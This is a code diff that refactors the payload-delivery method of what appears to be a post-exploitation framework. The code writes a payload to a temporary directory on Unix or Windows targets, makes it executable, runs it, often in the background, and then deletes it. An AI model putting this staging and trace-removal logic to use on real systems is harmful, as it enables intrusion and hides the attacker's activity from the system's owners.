@@ -74,50 +74,52 @@ class Post(object):
         :raises RuntimeError: with trailing error message
         """
 
-        method = select_method(
-            methods=self.push.methods,
-            platform=platform,
-            method=method
-        )
+        filename = self.string_tools.random_string(8)
+        arguments = arguments or ''
 
-        if method:
-            filename = self.string_tools.random_string(8)
-            arguments = arguments or ''
+        if platform in OS_UNIX:
+            location = location or '/tmp'
+            concat = concat or ';'
+            background = background or '&'
 
-            if platform in OS_UNIX:
-                location = location or '/tmp'
-                concat = concat or ';'
-                background = background or '&'
+            path = '/'.join((location, filename))
 
-                path = '/'.join((location, filename))
-
-                if isinstance(arch, Arch) and arch.interpreter:
-                    command = f"{arch.interpreter} {path} {arguments} {concat} rm {path}"
-                else:
-                    command = f"sh -c 'chmod 777 {path} {concat} {path} {arguments} {concat} rm {path}' {background}"
-
-            elif platform in OS_WINDOWS:
-                location = location or 'C:\\Windows\\Temp'
-                concat = concat or '&'
-                background = background or ''
-
-                path = '\\'.join((location, filename))
-
-                if isinstance(arch, Arch) and arch.interpreter:
-                    command = f"{background} {arch.interpreter} {path} {arguments} {concat} del {path}"
-                else:
-                    command = f"{background} {path} {arguments} {concat} del {path}"
-
+            if isinstance(arch, Arch) and arch.interpreter:
+                command = f"{arch.interpreter} {path} {arguments} {concat} rm {path}"
             else:
-                raise RuntimeError(f"Platform {platform} in unsupported!")
+                command = f"sh -c 'chmod 777 {path} {concat} {path} {arguments} {concat} rm {path}' {background}"
 
-            method.handler.push(
+        elif platform in OS_WINDOWS:
+            location = location or 'C:\\Windows\\Temp'
+            concat = concat or '&'
+            background = background or ''
+
+            path = '\\'.join((location, filename))
+
+            if isinstance(arch, Arch) and arch.interpreter:
+                command = f"{background} {arch.interpreter} {path} {arguments} {concat} del {path}"
+            else:
+                command = f"{background} {path} {arguments} {concat} del {path}"
+
+        else:
+            raise RuntimeError(f"Platform {platform} in unsupported!")
+
+        if not method.uri:
+            self.push.push(
+                platform=platform,
+                method=method,
                 sender=sender,
                 data=payload if isinstance(payload, bytes) else payload.encode(),
                 location=path,
                 *args, **kwargs
             )
-
-            self.post_tools.post_payload(sender, command)
         else:
-            self.post_tools.post_payload(sender, payload)
+            self.push.push(
+                platform=platform,
+                method=method,
+                sender=sender,
+                location=path,
+                *args, **kwargs
+            )
+
+        self.post_tools.post_payload(sender, command)
